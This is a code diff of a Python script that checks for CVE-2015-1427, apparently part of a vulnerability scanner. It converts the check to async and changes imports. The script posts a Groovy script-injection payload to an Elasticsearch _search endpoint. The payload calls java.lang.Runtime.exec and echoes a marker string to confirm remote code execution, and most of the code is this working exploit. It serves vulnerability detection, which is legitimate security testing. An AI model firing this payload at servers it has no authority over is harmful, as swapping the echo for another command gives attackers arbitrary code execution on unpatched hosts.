@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import json
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class CVE_2015_1427_BaseVerify:
     def __init__(self, url):
@@ -24,7 +24,7 @@ class CVE_2015_1427_BaseVerify:
         self.data_payload = {"name": "test"}
         self.check_payload = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"echo %s\").getText()" %(self.capta)}}} 
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -35,16 +35,13 @@ class CVE_2015_1427_BaseVerify:
         """
         
         try:
-            data_req = request.post(self.url + '/website/blog/', data = json.dumps(self.data_payload), headers = self.headers)
-            check_req = request.post(self.url + '/_search?pretty', data = json.dumps(self.check_payload), headers = self.headers)
-            if check_req.status_code == 200 and self.capta in json.loads(check_req.text)["hits"]["hits"][0]["fields"]["lupin"][0]:
+            data_req = await request.post(self.url + '/website/blog/', data = json.dumps(self.data_payload), headers = self.headers)
+            check_req = await request.post(self.url + '/_search?pretty', data = json.dumps(self.check_payload), headers = self.headers)
+            if check_req.status == 200 and self.capta in json.loads(await check_req.text())["hits"]["hits"][0]["fields"]["lupin"][0]:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
